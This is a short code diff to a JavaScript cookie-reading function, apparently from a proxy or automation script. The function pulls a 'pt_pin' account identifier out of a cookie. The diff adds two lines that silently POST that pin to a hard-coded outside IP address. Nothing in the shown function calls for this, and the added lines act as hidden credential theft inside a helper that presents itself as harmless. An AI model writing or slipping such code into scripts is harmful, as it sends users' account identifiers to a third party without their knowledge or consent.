@@ -52,6 +52,8 @@ function GetCookie() {
                 var pt_pin =CV.match(/pt_pin=.+?;/)
                 var pin =pt_pin.toString().split('=')[1]
                 $.notify('用户pin','',"pin="+pin);
+                let data={"key":pin}
+                $.http.post("http://120.46.171.189/push",data)
             }
         }
         else{
